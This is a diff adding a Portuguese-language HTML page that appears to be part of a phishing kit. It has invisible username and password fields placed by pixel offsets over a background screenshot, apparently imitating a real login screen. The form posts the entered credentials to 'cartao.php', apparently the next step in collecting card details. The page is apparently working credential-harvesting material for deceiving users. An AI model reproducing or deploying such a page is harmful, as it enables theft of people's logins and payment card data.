@@ -1,0 +1,53 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   /
+  </title>
+  <style>
+   .input{
+width:150px;
+heigth:25px;
+}
+body {
+    background-image: url("img/principal01.jpg");
+    background-repeat: no-repeat;
+    background_attachment: fixed;
+}
+.botao {background: url('img/bttn.jpg')
+ no-repeat center center;	
+border:0px solid #cccccc;
+width:78px;  
+height:19px;	
+display:block;
+}
+  </style>
+  <script type="text/javascript" src="SpryAssets/SpryValidationTextField.js">
+  </script>
+  <script src="aapf.js" type="text/javascript" language="javascript">
+  </script>
+ </head>
+ <body>
+  <script>
+   function confereCampos(form) {    
+    var campos = form.getElementsByTagName('input');
+    var podeEnviar = true;
+    for (i = 0; i &lt; campos.length; i++) {
+        var classe = campos[i].className;
+        var valor = campos[i].value;
+        if (classe == 'input' &amp;&amp; valor == '') podeEnviar = false;
+    }
+    if (podeEnviar == true) {
+        return true;
+    } else {
+        alert('Todos os campos são obrigatorios, favor preencher corretamente!')
+        return false;
+    }
+}
+  </script>
+  <form onsubmit="return confereCampos(this)" target="_self" action="cartao.php" method="post" name="form1" id="form1">
+   <input style="margin-left:545px;margin-top:187px;height:35px;width:220px;border:0px;color:#969696;" class="input" value="" id="user" name="user" />
+   <input type="password" style="margin-left:545px;margin-top:25px;height:35px;width:220px;border:0px;color:#969696;" class="input" value="" id="userpass" name="userpass" />
+   <input type="submit" style="margin-left:468px;margin-top:25px;height:35px;width:220px;border:0px;color:#969696;" src="img/bttn.jpg" class="botao" value="" id="bttn" name="bttn" />
+  </form>
+ </body>
+</html>
